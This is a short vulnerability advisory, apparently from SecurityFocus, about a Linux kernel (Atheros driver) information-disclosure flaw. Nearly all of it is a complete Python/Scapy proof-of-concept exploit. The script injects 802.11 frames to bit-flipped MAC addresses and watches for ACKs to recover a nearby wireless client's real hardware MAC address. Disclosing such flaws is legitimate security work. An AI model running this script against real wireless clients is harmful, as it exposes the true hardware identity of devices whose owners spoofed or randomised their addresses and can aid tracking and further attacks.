source: https://www.securityfocus.com/bid/63743/info

Linux Kernel is prone to an information-disclosure vulnerability.

An attacker can exploit this issue to obtain sensitive information like original MAC address; information obtained may aid in other attacks.

Note: This BID was previously titled 'Atheros Wireless Drivers MAC Address Information Disclosure Vulnerability'. The title and technical details have been changed to better reflect the underlying component affected.

#!/usr/bin/python
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import random

# number of times to inject probe for one bit (combat packet loss)
ATTEMPTS_PER_BIT = 6
# time to wait for ACK in seconds
SNIFFTIME = 0.3


def randmac():
	mac = [0] * 6
	for i in xrange(6):
		mac[i] = random.randint(0, 256)

	# avoid multicast/broadcast mac
	mac[0] = mac[0] & 0xFE

	return ":".join([format(byte, '02x') for byte in mac])


def parsemac(macstr):
	parts = macstr.replace("-", ":").split(":")
	if len(parts) != 6:
		raise ValueError("MAC does not consist of 6 parts (separated by : or -)")

	return [int(byte, 16) for byte in parts]


def is_ack(p):
	return Dot11 in p and p.type == 1 and p.subtype == 13


def find_fixed_bits(s, mac):
	# eventually contains the real MAC address
	orgmac = [0] * 6

	# random MAC address, used as sender, to which the target will send an ACK
	srcmac = randmac()

	# for all the bits - FIXME: Don't consider H.O. bit of first MAC byte
	for i in range(6):
		for bit in range(8):
			# flip the bit at current position
			currbit = mac[i] & (1 << bit)
			mac[i] ^= (1 << bit)

			# convert modified mac to string
			strmac = ":".join([format(byte, '02x') for byte in mac])
			print "Probing", strmac, "...",

			replied = False
			for attempt in range(ATTEMPTS_PER_BIT):
				# inject data packet to modified MAC address
				packet = Dot11(type="Data", subtype=4, FCfield="from-DS",
						addr1=strmac, addr2=srcmac, addr3=strmac)
				s.send(RadioTap()/packet)

				# Sniff air for ACK to modified MAC
				l = sniff(lfilter=lambda p: is_ack(p) and p.addr1 == srcmac, count=1,
						timeout=SNIFFTIME, opened_socket=s)

				# We we got an ACK, don't need to try again
				if len(l) == 1:
					replied = True
					break

			print replied

			# If client replied, original bit is different from the one currently set,
			# otherwise it's equal to original bit.
			if replied:
				orgmac[i] |= (~currbit) & (1 << bit)
			else:
				orgmac[i] |= currbit

			# flip bit back to original value
			mac[i] ^= (1 << bit)

	# Done, return original MAC
	return orgmac


if __name__ == "__main__":
	if len(sys.argv) != 3:
		print "Usage:", sys.argv[0], "interface macaddr"
		quit(1)

	try:
		mac = parsemac(sys.argv[2])
		conf.iface = sys.argv[1]

		random.seed()

		# Open up read/write socket so we don't miss the ACK
		L2socket = conf.L2socket
		s = L2socket(type=ETH_P_ALL, iface=conf.iface)

		# Now find the MAC
		orgmac = find_fixed_bits(s, mac)
		s.close()

		print "\nReal MAC address:", ":".join(format(byte, "02x") for byte in orgmac), "\n"
	except ValueError, e:
		print "Invalid MAC address:", e
	except socket.error, e:
		print "Error with provided interface:", e